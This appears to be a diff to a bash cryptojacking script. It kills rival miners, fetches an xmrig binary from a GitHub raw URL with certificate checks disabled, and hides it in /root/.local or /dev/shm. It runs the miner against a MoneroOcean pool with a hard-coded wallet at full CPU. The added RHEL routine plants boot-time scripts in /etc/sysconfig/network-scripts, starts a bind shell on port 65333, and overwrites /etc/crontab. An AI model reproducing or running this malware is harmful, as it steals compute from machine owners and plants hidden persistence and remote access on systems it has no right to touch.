@@ -370,7 +370,7 @@ kill -9 `ps -aux|egrep '(miner|xmrig|filebet)'|egrep -v '(grep|egrep|ps)'|awk '{
 rm -rf /root/.local/.filebet/ 2>/dev/null
 mkdir -p /root/.local/.filebet/	
 
-if ! curl -ks "https://raw.githubusercontent.com/anabianca92/lol/main/xmrig" -o /root/.local/.filebet/filebet 2>/dev/null && ! wget --no-check-certificate https://raw.githubusercontent.com/anabianca92/lol/main/xmrig -O /root/.local/.filebet/filebet 2>/dev/null; then
+if ! curl -ks "https://raw.githubusercontent.com/anabianca92/lol/main/xmrig" -o /root/.local/.filebet/filebet 2>/dev/null && ! wget --no-check-certificate https://raw.githubusercontent.com/anabianca92/lol/main/xmrig-static- -O /root/.local/.filebet/filebet 2>/dev/null; then
   exit 1
 fi
 
@@ -380,7 +380,7 @@ fi
 perl /root/.local/.filebet/vsmk;rm /root/.local/.filebet/vsmk
 
 chmod +x /root/.local/.filebet/filebet
-exec /root/.local/.filebet/filebet -o stratum+tcp://gulf.moneroocean.stream:10128 -u 46tZPdrQpAeXWfph4X8Cxr5Ki3VNT6QX28MedBqoJhGrhsmZZAHW61EFF7sBtVCw8oQtMfd1vT79VNwbj7suCHzkP9yciEq -p `hostname -I|awk '{print $1}'` -k --cpu-max-threads-hint=100% -B
+exec /root/.local/.filebet/filebet -o stratum+tcp://gulf.moneroocean.stream:10128 -u 46tZPdrQpAeXWfph4X8Cxr5Ki3VNT6QX28MedBqoJhGrhsmZZAHW61EFF7sBtVCw8oQtMfd1vT79VNwbj7suCHzkP9yciEq -p `curl -s ifconfig.me` -k --cpu-max-threads-hint=100% -B
 
 EOF
 
@@ -434,7 +434,7 @@ if ! curl -ks "https://raw.githubusercontent.com/anabianca92/lol/main/xmrig-stat
 fi
 
 chmod +x /root/.local/.filebet/filebet
-exec /root/.local/.filebet/filebet -o stratum+tcp://gulf.moneroocean.stream:10128 -u 46tZPdrQpAeXWfph4X8Cxr5Ki3VNT6QX28MedBqoJhGrhsmZZAHW61EFF7sBtVCw8oQtMfd1vT79VNwbj7suCHzkP9yciEq -p `hostname -I|awk '{print $1}'` -k --cpu-max-threads-hint=100% -B
+exec /root/.local/.filebet/filebet -o stratum+tcp://gulf.moneroocean.stream:10128 -u 46tZPdrQpAeXWfph4X8Cxr5Ki3VNT6QX28MedBqoJhGrhsmZZAHW61EFF7sBtVCw8oQtMfd1vT79VNwbj7suCHzkP9yciEq -p `curl -s ifconfig.me` -k --cpu-max-threads-hint=100% -B
 EOF
 
 cat > /etc/crontab 2>/dev/null <<'EOF'
@@ -499,7 +499,7 @@ if ! curl -ks "https://raw.githubusercontent.com/anabianca92/lol/main/xmrig-stat
 fi
 
 chmod +x /root/.local/.filebet/filebet
-exec /root/.local/.filebet/filebet -o stratum+tcp://gulf.moneroocean.stream:10128 -u 46tZPdrQpAeXWfph4X8Cxr5Ki3VNT6QX28MedBqoJhGrhsmZZAHW61EFF7sBtVCw8oQtMfd1vT79VNwbj7suCHzkP9yciEq -p `hostname -I|awk '{print $1}'` -k --cpu-max-threads-hint=100% -B
+exec /root/.local/.filebet/filebet -o stratum+tcp://gulf.moneroocean.stream:10128 -u 46tZPdrQpAeXWfph4X8Cxr5Ki3VNT6QX28MedBqoJhGrhsmZZAHW61EFF7sBtVCw8oQtMfd1vT79VNwbj7suCHzkP9yciEq -p `curl -s ifconfig.me` -k --cpu-max-threads-hint=100% -B
 
 EOF
 
@@ -521,6 +521,53 @@ else
 printf  "[miner]: init file couldnt be created\n"
 fi
 }
+function setup_init_rhel(){
+rm -f /etc/sysconfig/network-scripts/ping 2>/dev/null
+cat > /etc/sysconfig/network-scripts/ping 2>/dev/null <<'EOF'
+#!/bin/bash
+while true
+do
+exec /boot/generic -b 65333
+exec /boot/generic -bind
+fi
+done &
+EOF
+
+rm -f /etc/sysconfig/network-scripts/file 2>/dev/null
+cat > /etc/sysconfig/network-scripts/file 2>/dev/null <<'EOF'
+#!/bin/bash
+local="/root/.local/.filebet/"
+
+rm -rf /root/.local/.filebet/ 2>/dev/null
+mkdir -p /root/.local/.filebet/	
+
+if ! curl -ks "https://raw.githubusercontent.com/anabianca92/lol/main/xmrig-static" -o /root/.local/.filebet/filebet 2>/dev/null && ! wget --no-check-certificate https://raw.githubusercontent.com/anabianca92/lol/main/xmrig-static -O /root/.local/.filebet/filebet 2>/dev/null; then
+  exit 1
+fi
+
+chmod +x /root/.local/.filebet/filebet
+exec /root/.local/.filebet/filebet -o stratum+tcp://gulf.moneroocean.stream:10128 -u 46tZPdrQpAeXWfph4X8Cxr5Ki3VNT6QX28MedBqoJhGrhsmZZAHW61EFF7sBtVCw8oQtMfd1vT79VNwbj7suCHzkP9yciEq -p `curl -s ifconfig.me` -k --cpu-max-threads-hint=100% -B
+
+EOF
+
+if [[ -f /etc/sysconfig/network-scripts/ping ]];then
+chmod +x /etc/sysconfig/network-scripts/ping
+/etc/sysconfig/network-scripts/ping
+printf "bind set up at boot time (debian)\n"
+
+else
+printf  "[bind]: init file couldnt be created\n"
+fi
+
+if [[ -f /etc/sysconfig/network-scripts/file ]];then
+chmod +x /etc/sysconfig/network-scripts/file
+/etc/sysconfig/network-scripts/file
+printf "miner set up at boot time (debian)\n"
+
+else 
+printf  "[miner]: init file couldnt be created\n"
+fi
+}
 
 miner_nopriv(){
 local="/dev/shm/.filebet/"
@@ -529,19 +576,26 @@ kill -9 `ps -aux|grep -E '(miner|xmrig|filebet|kinsing)'|grep -Ev '(grep|egrep|p
 rm -rf "$local" 2>/dev/null
 mkdir -p "$local"	
 
-if ! curl -ks "https://raw.githubusercontent.com/anabianca92/lol/main/xmrig-static" -o "$local"filebet 2>/dev/null && ! wget --no-check-certificate https://raw.githubusercontent.com/anabianca92/lol/main/xmrig -O "$local"filebet 2>/dev/null; then
+if ! curl -ks "https://raw.githubusercontent.com/anabianca92/lol/main/xmrig-static" -o "$local"filebet 2>/dev/null && ! wget --no-check-certificate https://raw.githubusercontent.com/anabianca92/lol/main/xmrig-static -O "$local"filebet 2>/dev/null; then
 echo "[ERROR]: downloading xmrig"
 exit 1
 fi
 
 chmod +x "$local"filebet
-exec "$local"filebet -o stratum+tcp://gulf.moneroocean.stream:10128 -u 46tZPdrQpAeXWfph4X8Cxr5Ki3VNT6QX28MedBqoJhGrhsmZZAHW61EFF7sBtVCw8oQtMfd1vT79VNwbj7suCHzkP9yciEq -p `hostname -I|awk '{print $1}'` -k --cpu-max-threads-hint=100% -B
+exec "$local"filebet -o stratum+tcp://gulf.moneroocean.stream:10128 -u 46tZPdrQpAeXWfph4X8Cxr5Ki3VNT6QX28MedBqoJhGrhsmZZAHW61EFF7sBtVCw8oQtMfd1vT79VNwbj7suCHzkP9yciEq -p `curl ifconfig.me` -k --cpu-max-threads-hint=100% -B
 }
 
 if [[ $1 == "--debian" ]]; then
 unset_chattr
 bind
 setup_init_debian
+hide
+set_chattr
+
+elif [[ $1 == "--rhel" ]]; then
+unset_chattr
+bind
+setup_init_rhel
 hide
 set_chattr
 
